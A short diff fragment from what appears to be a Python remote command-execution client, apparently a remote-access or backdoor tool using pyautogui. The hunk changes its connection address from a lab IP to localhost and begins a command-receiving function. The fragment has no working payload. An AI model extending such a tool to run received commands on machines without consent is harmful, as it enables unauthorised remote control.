@@ -6,7 +6,7 @@ import os
 import pyautogui
 import base64
 
-HOST_IP = '10.10.10.103' 
+HOST_IP = '127.0.0.1' 
 PORT = 5555
 def cmd_recv(): # recieve command to be executed
     data = ''
